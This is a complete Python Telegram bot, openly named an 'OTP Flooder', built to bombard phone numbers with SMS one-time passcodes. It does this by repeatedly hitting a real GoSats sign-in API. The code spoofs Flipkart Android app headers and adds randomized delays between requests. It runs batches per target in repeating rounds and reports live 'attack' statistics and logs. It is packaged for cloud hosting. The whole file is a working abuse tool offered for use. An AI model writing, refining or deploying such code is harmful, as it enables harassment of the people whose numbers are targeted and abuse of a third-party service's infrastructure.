#!/usr/bin/env python3
"""
GoSats OTP Flooder Bot – Multi‑Target (Full Version)
Reads token from env var and keeps alive with a dummy web server.
"""

import os
import requests
import json
import threading
import time
import random
import re
from datetime import datetime, timedelta
from typing import Dict, List, Optional
import telebot
from telebot.types import Message, CallbackQuery, InlineKeyboardMarkup, InlineKeyboardButton

# -------------------- CONFIG --------------------
TELEGRAM_BOT_TOKEN = os.environ.get("TELEGRAM_BOT_TOKEN")
if not TELEGRAM_BOT_TOKEN:
    raise ValueError("TELEGRAM_BOT_TOKEN environment variable not set")

GOSATS_BASE_URL = "https://api.gosats.io"
OTP_ENDPOINT = "/v1/auth/user/fk/signin"

BATCH_SIZE = 4
BATCH_INTERVAL_MINUTES = 25
BATCH_INTERVAL_SECONDS = BATCH_INTERVAL_MINUTES * 60
DELAY_BETWEEN_TARGETS = 60  # seconds

HEADERS = {
    "User-Agent": "Mozilla/5.0 (Linux; Android 11; moto g power Build/RPMS31.Q1-54-13.3-10) Mobile [Flipkart/com.flipkart.android/3170100/9.8/UltraSDK/101/5.0.1]",
    "Content-Type": "application/json",
    "Accept": "*/*",
    "Origin": "https://externalapp.gosats.io",
    "Referer": "https://externalapp.gosats.io/",
    "X-Requested-With": "com.flipkart.android",
    "Sec-Fetch-Site": "same-site",
    "Sec-Fetch-Mode": "cors",
    "Sec-Fetch-Dest": "empty",
    "Accept-Language": "en,en-US;q=0.9",
    "Sec-Ch-Ua": '"Not;A=Brand";v="8", "Chromium";v="150", "Android WebView";v="150"',
    "Sec-Ch-Ua-Mobile": "?1",
    "Sec-Ch-Ua-Platform": '"Android"',
}

# -------------------- BOT INIT --------------------
bot = telebot.TeleBot(TELEGRAM_BOT_TOKEN, parse_mode='HTML')
active_attacks: Dict[int, Dict] = {}
attack_lock = threading.Lock()

# -------------------- KEYBOARDS --------------------
def get_main_keyboard():
    keyboard = InlineKeyboardMarkup(row_width=2)
    keyboard.add(
        InlineKeyboardButton("🎯 Targets", callback_data="manage_targets"),
        InlineKeyboardButton("📊 Status", callback_data="check_status"),
    )
    keyboard.add(
        InlineKeyboardButton("▶️ Start Attack", callback_data="start_attack"),
        InlineKeyboardButton("⏹️ Stop Attack", callback_data="stop_attack"),
    )
    keyboard.add(
        InlineKeyboardButton("📈 Stats", callback_data="show_stats"),
        InlineKeyboardButton("📋 Logs", callback_data="show_logs"),
    )
    keyboard.add(
        InlineKeyboardButton("❓ Help", callback_data="show_help"),
        InlineKeyboardButton("📋 History", callback_data="show_history"),
    )
    return keyboard

def get_targets_keyboard():
    keyboard = InlineKeyboardMarkup(row_width=1)
    keyboard.add(
        InlineKeyboardButton("➕ Add Number", callback_data="add_number"),
        InlineKeyboardButton("🗑️ Clear All", callback_data="clear_targets"),
        InlineKeyboardButton("📋 View List", callback_data="view_targets"),
        InlineKeyboardButton("🔙 Back", callback_data="back_main"),
    )
    return keyboard

def get_attack_controls():
    keyboard = InlineKeyboardMarkup(row_width=2)
    keyboard.add(
        InlineKeyboardButton("⏹️ Stop", callback_data="stop_attack"),
        InlineKeyboardButton("🔄 Restart", callback_data="restart_attack"),
    )
    keyboard.add(
        InlineKeyboardButton("📊 Live Stats", callback_data="show_stats"),
        InlineKeyboardButton("📋 Logs", callback_data="show_logs"),
    )
    keyboard.add(
        InlineKeyboardButton("🔙 Back", callback_data="back_main"),
    )
    return keyboard

def get_stop_keyboard():
    keyboard = InlineKeyboardMarkup()
    keyboard.add(
        InlineKeyboardButton("⏹️ Stop Attack", callback_data="stop_attack"),
        InlineKeyboardButton("🔙 Back", callback_data="back_main"),
    )
    return keyboard

# -------------------- ATTACK ENGINE --------------------
class OTPAttack:
    def __init__(self, user_id: int, phone_numbers: List[str]):
        self.user_id = user_id
        self.phone_numbers = phone_numbers
        self.running = False
        self.thread = None
        self.total_requests = 0
        self.success_count = 0
        self.fail_count = 0
        self.start_time = None
        self.last_batch_time = None
        self.next_batch_time = None
        self.last_error = None
        self.stats_message_id = None
        self.logs = []
        self.attack_id = f"ATT-{random.randint(1000, 9999)}"
        self.per_number = {num: {"success": 0, "fail": 0, "total": 0} for num in phone_numbers}
        self.current_target_index = 0

    def send_otp(self, phone: str) -> bool:
        url = f"{GOSATS_BASE_URL}{OTP_ENDPOINT}"
        payload = {"phoneNumber": phone}
        try:
            response = requests.post(url, headers=HEADERS, json=payload, timeout=10)
            self.total_requests += 1
            self.per_number[phone]["total"] += 1
            if response.status_code == 200:
                self.success_count += 1
                self.per_number[phone]["success"] += 1
                self.logs.append(f"✅ {phone} | {datetime.now().strftime('%H:%M:%S')}")
                return True
            else:
                self.fail_count += 1
                self.per_number[phone]["fail"] += 1
                try:
                    data = response.json()
                    err_msg = data.get("message", data.get("error", {}).get("message", "Unknown"))
                    self.last_error = err_msg
                    self.logs.append(f"❌ {phone} | {err_msg[:30]} | {datetime.now().strftime('%H:%M:%S')}")
                except:
                    err_msg = f"HTTP {response.status_code}"
                    self.last_error = err_msg
                    self.logs.append(f"❌ {phone} | {err_msg} | {datetime.now().strftime('%H:%M:%S')}")
                return False
        except requests.exceptions.Timeout:
            self.fail_count += 1
            self.total_requests += 1
            self.per_number[phone]["fail"] += 1
            self.last_error = "Timeout"
            self.logs.append(f"⏰ {phone} | Timeout | {datetime.now().strftime('%H:%M:%S')}")
            return False
        except Exception as e:
            self.fail_count += 1
            self.total_requests += 1
            self.per_number[phone]["fail"] += 1
            self.last_error = str(e)[:50]
            self.logs.append(f"⚠️ {phone} | {str(e)[:30]} | {datetime.now().strftime('%H:%M:%S')}")
            return False

    def attack_loop(self):
        self.running = True
        self.start_time = datetime.now()
        self.total_requests = 0
        self.success_count = 0
        self.fail_count = 0
        self.last_batch_time = None
        self.next_batch_time = None

        while self.running:
            for idx, phone in enumerate(self.phone_numbers):
                if not self.running:
                    break
                self.current_target_index = idx
                for i in range(BATCH_SIZE):
                    if not self.running:
                        break
                    self.send_otp(phone)
                    time.sleep(random.uniform(0.5, 1.5))
                    if self.total_requests % 2 == 0:
                        self.update_stats_message()
                if self.running and idx < len(self.phone_numbers) - 1:
                    wait_seconds = DELAY_BETWEEN_TARGETS
                    while wait_seconds > 0 and self.running:
                        sleep_chunk = min(5, wait_seconds)
                        time.sleep(sleep_chunk)
                        wait_seconds -= sleep_chunk
            if self.running:
                self.next_batch_time = datetime.now() + timedelta(seconds=BATCH_INTERVAL_SECONDS)
                wait_seconds = BATCH_INTERVAL_SECONDS
                while wait_seconds > 0 and self.running:
                    sleep_chunk = min(5, wait_seconds)
                    time.sleep(sleep_chunk)
                    wait_seconds -= sleep_chunk
                    if int(wait_seconds) % 60 == 0:
                        self.update_stats_message()
                self.next_batch_time = None

    def get_stats(self) -> str:
        if not self.start_time:
            return "❌ Attack not started"
        duration = (datetime.now() - self.start_time).total_seconds()
        minutes = int(duration // 60)
        seconds = int(duration % 60)

        success_rate = (self.success_count / max(1, self.total_requests)) * 100
        status_emoji = "🟢" if success_rate > 50 else ("🟡" if success_rate > 20 else "🔴")
        status = f"{status_emoji} LOCKED & TARGETING" if self.running else "⏹️ Stopped"

        next_batch_text = "N/A"
        if self.running and self.next_batch_time:
            remaining = (self.next_batch_time - datetime.now()).total_seconds()
            if remaining > 0:
                rem_min = int(remaining // 60)
                rem_sec = int(remaining % 60)
                next_batch_text = f"{rem_min}m {rem_sec}s"
            else:
                next_batch_text = "Sending batch..."
        elif self.running and not self.next_batch_time:
            next_batch_text = "Sending batch..."

        per_num_lines = []
        for num, stats in self.per_number.items():
            per_num_lines.append(f"  📱 {num}: {stats['total']} req, ✅{stats['success']} ❌{stats['fail']}")
        per_num_text = "\n".join(per_num_lines) if per_num_lines else "No targets"

        stats_text = f"""
🎯 <b>ATTACK STATUS</b>
{'═' * 30}

🆔 <b>Attack ID:</b> <code>{self.attack_id}</code>
📱 <b>Targets:</b> {len(self.phone_numbers)} numbers
🔒 <b>Status:</b> {status}
⏱️  <b>Duration:</b> {minutes}m {seconds}s

📊 <b>Overall Stats:</b>
├─ 📨 Total Requests: {self.total_requests}
├─ ✅ Success: {self.success_count}
├─ ❌ Failed: {self.fail_count}
└─ 📈 Success Rate: {success_rate:.1f}%

📋 <b>Per‑Target Stats:</b>
{per_num_text}

⏳ <b>Next round in:</b> {next_batch_text}
📦 <b>Batch size:</b> {BATCH_SIZE} OTPs per number
⏱️  <b>Delay between targets:</b> {DELAY_BETWEEN_TARGETS}s
🔄 <b>Round interval:</b> {BATCH_INTERVAL_MINUTES} min

⚠️ <b>Last Error:</b> {self.last_error or 'None'}

<i>🔄 Attack runs in rounds – press "Stop" to end.</i>
"""
        return stats_text

    def get_recent_logs(self, limit=15) -> str:
        if not self.logs:
            return "📋 No logs available"
        recent = self.logs[-limit:]
        log_text = "\n".join(recent)
        return f"📋 <b>Recent Logs</b>\n{'═'*20}\n{log_text}\n{'═'*20}\n<i>Total entries: {len(self.logs)}</i>"

    def update_stats_message(self):
        if self.stats_message_id and self.running:
            try:
                bot.edit_message_text(
                    self.get_stats(),
                    self.user_id,
                    self.stats_message_id,
                    parse_mode='HTML',
                    reply_markup=get_attack_controls()
                )
            except:
                pass

    def start_attack(self, message_id: Optional[int] = None):
        if self.thread and self.thread.is_alive():
            return
        self.stats_message_id = message_id
        self.thread = threading.Thread(target=self.attack_loop)
        self.thread.daemon = True
        self.thread.start()

    def stop_attack(self):
        self.running = False
        if self.thread:
            self.thread.join(timeout=2)

# -------------------- TARGET & HISTORY HELPERS --------------------
def get_targets(user_id: int) -> List[str]:
    if not hasattr(get_targets, 'storage'):
        get_targets.storage = {}
    return get_targets.storage.get(user_id, [])

def set_targets(user_id: int, numbers: List[str]):
    if not hasattr(get_targets, 'storage'):
        get_targets.storage = {}
    get_targets.storage[user_id] = numbers

def add_target(user_id: int, number: str):
    targets = get_targets(user_id)
    if number not in targets:
        targets.append(number)
        set_targets(user_id, targets)

def clear_targets(user_id: int):
    set_targets(user_id, [])

def get_history(user_id: int) -> List[Dict]:
    if not hasattr(get_history, 'storage'):
        get_history.storage = {}
    return get_history.storage.get(user_id, [])

def save_history(user_id: int, history: List[Dict]):
    if not hasattr(get_history, 'storage'):
        get_history.storage = {}
    get_history.storage[user_id] = history[-50:]

# -------------------- BOT COMMANDS --------------------
@bot.message_handler(commands=['start'])
def start_command(message: Message):
    user_id = message.from_user.id
    welcome = f"""
🚀 <b>GoSats OTP Flooder – Multi‑Target</b>

Welcome <b>{message.from_user.first_name}</b>! 👋

<b>⚡ Features:</b>
• Add multiple phone numbers
• Each round: {BATCH_SIZE} OTPs per number
• {DELAY_BETWEEN_TARGETS}s delay between targets
• Full round every {BATCH_INTERVAL_MINUTES} minutes
• Live stats, logs, history

<b>📱 How to add targets:</b>
Send a message with numbers separated by commas or newlines.
Example:
<code>+9198XXXXXXX1, +9198XXXXXXX2</code>
or
<code>+9198XXXXXXX1
+9198XXXXXXX2</code>

Then click "Start Attack" to begin.
"""
    bot.send_message(user_id, welcome, parse_mode='HTML', reply_markup=get_main_keyboard())

@bot.message_handler(commands=['help'])
def help_command(message: Message):
    show_help(message.from_user.id)

@bot.message_handler(commands=['stop'])
def stop_command(message: Message):
    handle_stop_attack(message.from_user.id)

# -------------------- CALLBACK HANDLERS --------------------
@bot.callback_query_handler(func=lambda call: True)
def handle_callback(call: CallbackQuery):
    user_id = call.from_user.id
    data = call.data
    bot.answer_callback_query(call.id)

    if data == "manage_targets":
        handle_manage_targets(user_id, call.message.message_id)
    elif data == "add_number":
        bot.send_message(user_id, "📱 Send the phone number you want to add.\nFormat: +9198XXXXXXXX", reply_markup=get_stop_keyboard())
    elif data == "clear_targets":
        clear_targets(user_id)
        bot.edit_message_text("🗑️ All targets cleared.", user_id, call.message.message_id, reply_markup=get_main_keyboard())
    elif data == "view_targets":
        handle_view_targets(user_id, call.message.message_id)
    elif data == "start_attack":
        handle_start_attack(user_id)
    elif data == "stop_attack":
        handle_stop_attack(user_id)
    elif data == "restart_attack":
        handle_restart_attack(user_id)
    elif data == "check_status":
        handle_check_status(user_id)
    elif data == "show_stats":
        handle_show_stats(user_id)
    elif data == "show_logs":
        handle_show_logs(user_id)
    elif data == "show_history":
        handle_show_history(user_id)
    elif data == "show_help":
        show_help(user_id)
    elif data == "back_main":
        bot.edit_message_text("🔙 <b>Main Menu</b>", user_id, call.message.message_id, parse_mode='HTML', reply_markup=get_main_keyboard())

# -------------------- HANDLER FUNCTIONS --------------------
def handle_manage_targets(user_id: int, message_id: int):
    targets = get_targets(user_id)
    if targets:
        num_list = "\n".join([f"• {n}" for n in targets])
        text = f"📱 <b>Your Targets ({len(targets)})</b>\n{num_list}"
    else:
        text = "📱 <b>No targets added yet.</b>\n\nSend numbers as described in /start."
    bot.edit_message_text(text, user_id, message_id, parse_mode='HTML', reply_markup=get_targets_keyboard())

def handle_view_targets(user_id: int, message_id: int):
    targets = get_targets(user_id)
    if targets:
        num_list = "\n".join([f"• {n}" for n in targets])
        text = f"📋 <b>Current targets ({len(targets)})</b>\n{num_list}"
    else:
        text = "📋 No targets."
    bot.edit_message_text(text, user_id, message_id, parse_mode='HTML', reply_markup=get_targets_keyboard())

def handle_start_attack(user_id: int):
    targets = get_targets(user_id)
    if not targets:
        bot.send_message(user_id, "❌ No targets added. Please add at least one phone number.", reply_markup=get_main_keyboard())
        return
    # Validate numbers
    valid = []
    for num in targets:
        num = num.replace(" ", "").replace("-", "").replace("(", "").replace(")", "")
        if not num.startswith("+"):
            if num.startswith("0"):
                num = num[1:]
            if len(num) == 10:
                num = f"+91{num}"
            else:
                num = f"+{num}"
        if num.startswith("+") and len(num) >= 10:
            valid.append(num)
        else:
            bot.send_message(user_id, f"⚠️ Invalid number skipped: {num}", parse_mode='HTML')
    if not valid:
        bot.send_message(user_id, "❌ No valid numbers. Please add correct numbers.", reply_markup=get_main_keyboard())
        return
    set_targets(user_id, valid)
    with attack_lock:
        if user_id in active_attacks:
            active_attacks[user_id].stop_attack()
            del active_attacks[user_id]
        attack = OTPAttack(user_id, valid)
        active_attacks[user_id] = attack

    msg = bot.send_message(
        user_id,
        f"🔒 <b>ATTACK STARTED</b>\n"
        f"📱 Targets: {len(valid)}\n"
        f"📦 {BATCH_SIZE} OTPs per target, {DELAY_BETWEEN_TARGETS}s between targets\n"
        f"⏳ Next round in: {BATCH_INTERVAL_MINUTES} min\n\n"
        f"<i>Use 'Live Stats' to monitor.</i>",
        parse_mode='HTML',
        reply_markup=get_attack_controls()
    )
    attack.start_attack(msg.message_id)

def handle_stop_attack(user_id: int):
    with attack_lock:
        if user_id in active_attacks:
            attack = active_attacks[user_id]
            attack.stop_attack()
            history = get_history(user_id)
            history.append({
                "targets": attack.phone_numbers.copy(),
                "total": attack.total_requests,
                "success": attack.success_count,
                "fail": attack.fail_count,
                "duration": str(datetime.now() - attack.start_time) if attack.start_time else "N/A",
                "time": datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            })
            save_history(user_id, history)
            del active_attacks[user_id]
            bot.send_message(
                user_id,
                f"⏹️ <b>Attack Stopped</b>\n"
                f"Total: {attack.total_requests} | ✅{attack.success_count} ❌{attack.fail_count}",
                parse_mode='HTML',
                reply_markup=get_main_keyboard()
            )
        else:
            bot.send_message(user_id, "❌ No active attack.", reply_markup=get_main_keyboard())

def handle_restart_attack(user_id: int):
    targets = get_targets(user_id)
    if not targets:
        bot.send_message(user_id, "❌ No targets. Add numbers first.", reply_markup=get_main_keyboard())
        return
    with attack_lock:
        if user_id in active_attacks:
            active_attacks[user_id].stop_attack()
            del active_attacks[user_id]
        attack = OTPAttack(user_id, targets)
        active_attacks[user_id] = attack
    msg = bot.send_message(user_id, "🔄 Restarting attack...", reply_markup=get_attack_controls())
    attack.start_attack(msg.message_id)

def handle_check_status(user_id: int):
    with attack_lock:
        if user_id in active_attacks:
            attack = active_attacks[user_id]
            bot.send_message(user_id, attack.get_stats(), parse_mode='HTML', reply_markup=get_attack_controls())
        else:
            bot.send_message(user_id, "🟢 No active attack.", reply_markup=get_main_keyboard())

def handle_show_stats(user_id: int):
    with attack_lock:
        if user_id in active_attacks:
            attack = active_attacks[user_id]
            msg = bot.send_message(user_id, attack.get_stats(), parse_mode='HTML', reply_markup=get_attack_controls())
            attack.stats_message_id = msg.message_id
        else:
            bot.send_message(user_id, "❌ No active attack.", reply_markup=get_main_keyboard())

def handle_show_logs(user_id: int):
    with attack_lock:
        if user_id in active_attacks:
            attack = active_attacks[user_id]
            bot.send_message(user_id, attack.get_recent_logs(), parse_mode='HTML', reply_markup=get_attack_controls())
        else:
            bot.send_message(user_id, "❌ No active attack.", reply_markup=get_main_keyboard())

def handle_show_history(user_id: int):
    history = get_history(user_id)
    if not history:
        bot.send_message(user_id, "📋 No history.", reply_markup=get_main_keyboard())
        return
    recent = history[-5:]
    text = "📋 <b>Recent Attacks</b>\n" + "═"*20 + "\n"
    for i, entry in enumerate(recent, 1):
        text += f"{i}. Targets: {len(entry['targets'])} | Total: {entry['total']} | ✅{entry['success']} ❌{entry['fail']} | {entry['duration']}\n"
    bot.send_message(user_id, text, parse_mode='HTML', reply_markup=get_main_keyboard())

def show_help(user_id: int):
    help_text = f"""
📚 <b>Help – Multi‑Target OTP Flooder</b>

<b>Commands:</b>
/start – Main menu
/stop  – Stop current attack
/help  – This guide

<b>Adding Targets:</b>
Send a message with numbers separated by commas or newlines.
Example:
<code>+9198XXXXXXX1, +9198XXXXXXX2</code>

<b>Attack Pattern:</b>
• Each round: process all targets one by one.
• Per target: send {BATCH_SIZE} OTPs (with small delays).
• Delay between targets: {DELAY_BETWEEN_TARGETS} seconds.
• After all targets: wait {BATCH_INTERVAL_MINUTES} minutes, then repeat.

<b>Buttons:</b>
• Targets – add/remove/view numbers
• Start Attack – begin the cycle
• Stop Attack – halt immediately
• Stats – live counters per target
• Logs – recent request history
"""
    bot.send_message(user_id, help_text, parse_mode='HTML', reply_markup=get_main_keyboard())

# -------------------- TEXT MESSAGE HANDLER --------------------
@bot.message_handler(func=lambda message: True)
def handle_text_messages(message: Message):
    user_id = message.from_user.id
    text = message.text.strip()
    parts = re.split(r'[,;\n\r\s]+', text)
    numbers = [p.strip() for p in parts if p.strip()]
    valid = []
    for num in numbers:
        if any(c.isdigit() for c in num) and len(num) >= 10:
            valid.append(num)
    if valid:
        for num in valid:
            add_target(user_id, num)
        bot.send_message(
            user_id,
            f"✅ Added {len(valid)} number(s). Total targets: {len(get_targets(user_id))}",
            reply_markup=get_main_keyboard()
        )
    else:
        bot.send_message(
            user_id,
            "📝 No valid phone numbers detected. Send numbers like +9198XXXXXXXX.",
            reply_markup=get_main_keyboard()
        )

# -------------------- DUMMY WEB SERVER (for Railway) --------------------
def start_http_server():
    from http.server import HTTPServer, BaseHTTPRequestHandler
    class DummyHandler(BaseHTTPRequestHandler):
        def do_GET(self):
            self.send_response(200)
            self.end_headers()
            self.wfile.write(b"Bot is running")
    port = int(os.environ.get("PORT", 8080))
    server = HTTPServer(('0.0.0.0', port), DummyHandler)
    print(f"🟢 Dummy HTTP server running on port {port}")
    server.serve_forever()

# -------------------- MAIN --------------------
def main():
    print("""
╔═══════════════════════════════════════════════════════════════╗
║     🚀 GoSats OTP Flooder – Multi‑Target Edition           ║
║     Railway-ready with dummy web server                     ║
╚═══════════════════════════════════════════════════════════════╝
    """)
    # Start the dummy server in a separate thread
    http_thread = threading.Thread(target=start_http_server, daemon=True)
    http_thread.start()

    # Start the bot
    try:
        bot.remove_webhook()
        print("✅ Bot started successfully!")
        print("📱 Waiting for commands...")
        bot.polling(non_stop=True, interval=1, timeout=60)
    except Exception as e:
        print(f"❌ Error: {e}")
        time.sleep(5)
        main()

if __name__ == "__main__":
    main()
